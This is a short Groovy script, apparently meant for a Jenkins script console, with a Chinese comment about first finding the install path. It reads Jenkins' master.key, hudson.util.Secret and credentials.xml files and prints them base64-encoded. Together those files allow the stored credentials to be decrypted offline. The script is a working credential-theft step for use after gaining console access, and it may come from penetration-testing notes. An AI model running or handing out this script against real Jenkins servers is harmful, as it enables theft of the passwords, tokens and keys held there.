// 先使用 dump-env 获取下 base 路径

def base  = "C:/Program Files (x86)/Jenkins/"
def files = ["secrets/master.key", "credentials.xml", "secrets/hudson.util.Secret"]

for (i = 0; i < files.size(); i ++)
{
	try {
		File file = new File(base + files[i])
		println (files[i] + ":\n" + file.bytes.encodeBase64() + "\n")
	}
	catch(Exception e) {
		println (files[i] + " exception: " + e.toString() + "\n")
	}
}

